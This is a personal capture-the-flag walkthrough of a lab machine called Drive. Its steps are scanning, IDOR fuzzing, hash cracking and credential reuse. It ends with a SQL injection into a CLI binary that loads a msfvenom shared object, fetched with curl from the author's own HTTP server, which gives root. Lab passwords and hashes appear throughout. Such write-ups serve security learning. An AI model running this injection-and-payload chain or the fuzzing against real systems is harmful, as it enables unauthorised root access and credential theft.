# Drive.

## Difficulty: EASY

## OS: Linux

### Enumeration:

Start with Rustscan and then nmap on the open ports.

```bash
m0j0@r1s1n: ~/HTB/machines/drive
$ rustscan 10.10.11.235 --ulimit 5000                                                                                                      [14:49:49]
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/m0j0/.config/rustscan/config.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.235:22
Open 10.10.11.235:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.235

Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-15 14:50 BST
Initiating Ping Scan at 14:50
Scanning 10.10.11.235 [2 ports]
Completed Ping Scan at 14:50, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:50
Completed Parallel DNS resolution of 1 host. at 14:50, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:50
Scanning 10.10.11.235 [2 ports]
Discovered open port 22/tcp on 10.10.11.235
Discovered open port 80/tcp on 10.10.11.235
Completed Connect Scan at 14:50, 0.03s elapsed (2 total ports)
Nmap scan report for 10.10.11.235
Host is up, received conn-refused (0.019s latency).
Scanned at 2023-10-15 14:50:24 BST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
```

**Nmap**

```bash
m0j0@r1s1n: ~/HTB/machines/drive
$ nmap -p 22,80 -sCV 10.10.11.235                                                                                                          [14:53:00]
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-15 14:53 BST
Nmap scan report for 10.10.11.235
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://drive.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds

```

There’s a domain to add to `/etc/hosts` . It is a take on Google Drive xD.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/82c6841a-c60e-4300-931e-62ae4aa19d48/898040f5-0738-4fa9-949d-7eedafe73b9e/Untitled.png)

A register and login so I assume there is more but first let me fuzz for some sub-domains and directories in the background.

I registered with -

- user = m0j0@test.com
- password = DearHTBHello

I can now upload a file. 

**GoBuster:**

```bash
m0j0@r1s1n: ~/HTB/machines/drive
$ gobuster -m dir -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://drive.htb                                                    [15:31:54]

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://drive.htb/
[+] Threads      : 10
[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/10/15 15:32:28 Starting gobuster
=====================================================
/contact (Status: 301)
/favicon.ico (Status: 200)
/home (Status: 301)
/login (Status: 301)
/logout (Status: 301)
/register (Status: 301)
/reports (Status: 301)
/subscribe (Status: 301)
/uploader (Status: 302)
/upload (Status: 301)
/upload_file (Status: 302)
/uploaded (Status: 302)
/uploadedimages (Status: 302)
/upload_files (Status: 302)
/uploadfile (Status: 302)
/uploadedfiles (Status: 302)
/uploadfiles (Status: 302)
/uploads (Status: 302)
=====================================================
2023/10/15 15:32:44 Finished
=====================================================
```

I wonder is it a file upload or is that a rabbit-hole?? It is a rabbit hole

So it turns out the id parameter has an IDOR vuln and I can FUZZ or use a python script to do it I’ll show both wfuzz worked for me:

```
NOTE:
hey team after the great success of the platform we need now to continue the work.
on the new features for ours platform.
I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".
please make the necessary changes to the code before the end of the month
I will reach you soon with the token to apply your changes on the repo
thanks!
```

Heres the FUZZ and script:

```bash
m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/drive master ⚡
$ wfuzz -u http://drive.htb/FUZZ/block/ -z range,0-200 -H "Cookie:csrftoken=H8kKPtUUxBrKElKWZd00GZJKvMokw0Ez; sessionid=5b6n3ar3gzp80m9enr2mkwvttuwtyb4o" --hc 404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://drive.htb/FUZZ/block/
Total requests: 201

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                              
=====================================================================

000000080:   200        174 L    424 W      5438 Ch     "79"                                                                                 
000000101:   200        175 L    382 W      5195 Ch     "100"                                                                                
000000099:   200        170 L    365 W      5016 Ch     "98"                                                                                 
000000100:   200        170 L    372 W      5058 Ch     "99"                                                                                 
000000102:   200        176 L    416 W      5478 Ch     "101"
```

Going to 79 gives me the note with pass.
**python script** (iDomino):

```python
m0j0@r1s1n: ~/HTB/machines/drive
$ cat fuzz.py                                                                                                                               [2:01:54]
import requests

cookies = {
    'sessionid': '5b6n3ar3gzp80m9enr2mkwvttuwtyb4o'
}

for i in range(0,200):
    url = f'http://drive.htb/%31%31%32/getFileDetail/'
    resp = requests.get(url,cookies=cookies)
    if 'unauthorized' in resp.text:
        print('File',i,'exists!')
```

Doesn’t work for me 😟and it looks like wfuzz code, anyway lets log in.

```bash
martin@drive:~$ id
uid=1001(martin) gid=1001(martin) groups=1001(martin)
```

Time to enumerate martin as there is no user text. There are other ports open in martins shell.

```bash
martin@drive:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*
```

There is SQL (3306) and Gitea (3000) i will forward the Gites to see if there is any info.
This is interesting a SQLite3 DB with:

```bash
#!/bin/bash
DB=$1
date_str=$(date +'%d_%b')
7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3
cd /var/www/backups/
ls -l --sort=t *.7z > backups_num.tmp
backups_num=$(cat backups_num.tmp | wc -l)
if [[ $backups_num -gt 10 ]]; then
      #backups is more than 10... deleting to oldest backup
      rm $(ls  *.7z --sort=t --color=never | tail -1)
      #oldest backup deleted successfully!
fi
rm backups_num.tmp
```

If I can get the backups, maybe I can with scp:

```bash
scp -r "martin@drive.htb:/var/www/backups/" .
```

This should drop the files locally using the password found and it does, It sis amd I was able to dump a DB with hashes:

```bash
:34.294890',1,'admin','','','admin@drive.htb',1,1,'2022-12-08 14:59:02.802351');
INSERT INTO accounts_customuser VALUES(21,'pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=','2022-12-24 22:39:42.847497',0,'jamesMason','','','jamesMason@drive.htb',0,1,'2022-12-23 12:33:04.637591');
INSERT INTO accounts_customuser VALUES(22,'pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=','2022-12-24 12:55:10.152415',0,'martinCruz','','','martin@drive.htb',0,1,'2022-12-23 12:35:02.230289');
INSERT INTO accounts_customuser VALUES(23,'pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=','2022-12-26 06:20:23.299662',0,'tomHands','','','tom@drive.htb',0,1,'2022-12-23 12:37:45');
INSERT INTO accounts_customuser VALUES(24,'pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=','2022-12-24 16:51
```

They looked hard to crack.Checking another DB I found SHA1 hashes which might be easier.

They where:

```bash
m0j0@r1s1n: ~/HTB/machines/drive
$ hashcat -m 124 hashs /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt                                                                 [3:58:27]
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 6870/13805 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 124 (Django (SHA-1))
Hash.Target......: hashs
Time.Started.....: Thu Oct 19 04:00:16 2023 (12 secs)
Time.Estimated...: Thu Oct 19 04:00:28 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5079.3 kH/s (0.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/5 (20.00%) Digests, 1/5 (20.00%) Salts
Progress.........: 71721920/71721920 (100.00%)
Rejected.........: 0/71721920 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b6d3831303838] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 69c Util: 77%

Started: Thu Oct 19 03:59:37 2023
Stopped: Thu Oct 19 04:00:29 2023
FAIL: 1
```

`sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7`

Who is this for?

```bash

INSERT INTO accounts_customuser VALUES(21,'sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a','2022-12-26 05:48:27.497873',0,'jamesMason','','','jamesMason@drive.htb',0,1,'2022-12-23 12:33:04');
INSERT INTO accounts_customuser VALUES(22,'sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f','2022-12-24 12:55:10',0,'martinCruz','','','martin@drive.htb',0,1,'2022-12-23 12:35:02');
INSERT INTO accounts_customuser VALUES(23,'sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a','2022-12-24 13:17:45',0,'tomHands','','','tom@drive.htb',0,1,'2022-12-23 12:37:45');
INSERT INTO accounts_customuser VALUES(24,'sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f','2022-12-24 16:51:53',0,'crisDisel','','','cris@drive.htb',0,1,'2022-12-23 12:39:15');
INSERT INTO accounts_customuser VALUES(30,'sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3','2022-12-26 05:43:40.388717',1,'admin','','','admin@drive.htb',1,1,'2022-12-26 05:30:58.003372');
```

It ends in 25a which is tom I’ll try su first with the pass. And I’m tom and get user 😀

### Priv Esc and Root.

hmmmmmmmmmmm

So I got the doodlegrive binary by scp to my machine and found creds.

```bash
m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/drive master ⚡
$ scp -r tom@drive.htb:/home/tom/doodleGrive-cli .                                                                                          [6:07:51]
tom@drive.htb's password: 
doodleGrive-cli

```

```bash
004022d5 48 8d 35        LEA        RSI,[s_moriarty_0049743f]                        = "moriarty"
                 63 51 09 00
        004022dc 48 89 c7        MOV        RDI,RAX
        004022df e8 4c ee        CALL       strcmp                                           int strcmp(char * __s1, char * _
                 ff ff
        004022e4 85 c0           TEST       EAX,EAX
        004022e6 75 2a           JNZ        LAB_00402312
        004022e8 48 8d 45 c0     LEA        RAX=>local_48,[RBP + -0x40]
        004022ec 48 8d 35        LEA        RSI,[s_findMeIfY0uC@nMr.Holmz!_00497448]         = "findMeIfY0uC@nMr.Holmz!"
                 55 51 09 00
        004022f3 48 89 c7        MOV        RDI,RAX
        004022f6 e8 35 ee        CALL       strcmp                                           int strcmp(char * __s1, char * _
                 ff ff
        004022fb 85 c0           TEST       EAX,EAX
        004022fd 75 13           JNZ        LAB_00402312
        004022ff 48 8d 3d        LEA        RDI,[s_Welcome...!_00497460]                     = "Welcome...!"
                 5a 51 09 00
        00402306 e8 95 79        CALL       puts                                             int puts(char * __s)
                 01 00
        0040230b e8 96 fd        CALL       main_menu                                        undefined main_menu()
                 ff ff
        00402310 eb 0c           JMP        LAB_0040231e
                             LAB_00402312                                    XREF[2]:     004022e6(j), 004022fd(j)  
        00402312 48 8d 3d        LEA        RDI,[s_Invalid_username_or_password._0049746c]   = "Invalid username or password."
                 53 51 09 00
```

I wonder can I launch the app?
The trick here is to build a payload using msfvenom, I had to switch to Kali as my Ubuntu MSF seemed to crash.

So load_extension is enabled. I create a file locally:

```bash
m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/drive master ⚡
$ cat test                                                                                                                   [3:10:49]
moriarty
findMeIfY0uC@nMr.Holmz!
5
"+load_extension(char(46,47,97))--
6`

```

I then realised I needed Kali so:

```bash
┌──(m0j0㉿r1s1n)-[~/HTB/machines/drivw]
└─$ msfvenom -p linux/x64/exec -f elf-so CMD='id;cat /root/root.txt'  > a.so
^[t^[t[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 58 bytes
Final size of elf-so file: 460 bytes

                                                                                                                                     
┌──(m0j0㉿r1s1n)-[~/HTB/machines/drivw]
└─$ ls
a.so  test
                                                                                                                                     
┌──(m0j0㉿r1s1n)-[~/HTB/machines/drivw]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.235 - - [20/Oct/2023 18:20:43] "GET /a.so HTTP/1.1" 200 -
10.10.11.235 - - [20/Oct/2023 18:24:52] "GET /a.so HTTP/1.1" 200 -
10.10.11.235 - - [20/Oct/2023 18:28:12] "GET /a.so HTTP/1.1" 200 -
10
```

Built payload and test file again and started a server, Now the fun bit

In toms shell call the test file and are malicious `.so`file:

```bash
tom@drive:~$ curl http://10.10.14.17:8000/a.so -o a.so; curl http://10.10.14.17:8000/test -o test; ./doodleGrive-cli < test
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   460  100   460    0     0   9200      0 --:--:-- --:--:-- --:--:--  9200
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    73  100    73    0     0   1237      0 --:--:-- --:--:-- --:--:--  1237
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
Enter password for moriarty:
Welcome...!

doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: Enter username to activate account: Activating account for user '"+load_extension(char(46,47,97))--'...
uid=0(root) gid=0(root) groups=0(root),1003(tom)
9386192288eb3d65d1eb41c47e1fe865

doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: exiting...
tom@drive:~$
```

I can read root.txt 😄 I will try for a shell later.
Oh big thanks to Idomino for the learnings
